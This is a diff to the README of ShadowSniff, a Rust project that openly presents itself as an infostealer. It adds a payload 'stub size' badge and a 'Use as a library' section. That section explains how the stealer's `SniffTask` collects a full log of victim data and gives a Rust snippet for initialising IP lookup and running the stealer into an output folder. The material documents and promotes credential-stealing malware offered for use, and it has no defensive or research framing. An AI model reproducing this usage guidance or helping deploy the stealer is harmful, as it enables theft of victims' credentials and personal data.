@@ -10,6 +10,7 @@
         <a href="https://github.com/sqlerrorthing/ShadowSniff/network/members"><img src="https://img.shields.io/github/forks/sqlerrorthing/ShadowSniff?style=for-the-badge&labelColor=%239f0000&color=%23D73332" alt="Forks"></a>
         <a href="https://github.com/sqlerrorthing/ShadowSniff/stargazers"><img src="https://img.shields.io/github/stars/sqlerrorthing/ShadowSniff?style=for-the-badge&labelColor=%239f0000&color=%23D73332" alt="Stargazers"></a>
         <a href="https://github.com/sqlerrorthing/ShadowSniff/issues"><img src="https://img.shields.io/github/issues/sqlerrorthing/ShadowSniff?style=for-the-badge&labelColor=%239f0000&color=%23D73332" alt="Issues"></a>
+        <img src="https://img.shields.io/badge/STUB%20SIZE-700KB-red?style=for-the-badge&labelColor=%239f0000&color=%23D73332" alt="Stub size">
         <a href="https://github.com/sqlerrorthing/ShadowSniff/blob/master/LICENSE"><img src="https://img.shields.io/github/license/sqlerrorthing/ShadowSniff?style=for-the-badge&labelColor=%239f0000&color=%23D73332" alt="License"></a>
     </div>
 </div>
@@ -67,6 +68,37 @@ whether it's a bug fix, a new feature, or just an idea.
 a small action that makes a big difference!
 
 Thanks for being part of the project ❤️
+
+## Use as a library
+This stealer is task-based.
+Each task can spawn subtasks, but the main task is `shadowsniff::SniffTask`, 
+which is responsible for collecting the entire log.
+
+There are also composite tasks that contain other tasks.
+When started, each task runs in its own thread.
+A composite task waits for all its subtasks to finish before it completes.
+
+The stealer **does not use the Rust standard library**.
+The `utils::path::Path` type used in `run` comes from the crate `utils`.
+
+Before calling `SniffTask::new().run(&base_path)`, you **must** call `ipinfo::init_ip_info()`, otherwise it won't work.
+```rust
+use utils::path::Path;
+use ipinfo::init_ip_info;
+use shadowsniff::SniffTask;
+
+fn main() {
+    if !init_ip_info() {
+        panic!("Failed to initialize IP info");
+    }
+
+    let base_path = Path::new("output");
+    
+    unsafe {
+        SniffTask::new().run(&base_path);
+    }
+}
+```
 
 ## Acknowledgments
 This project has been inspired by a variety of open-source infostealers available on GitHub.
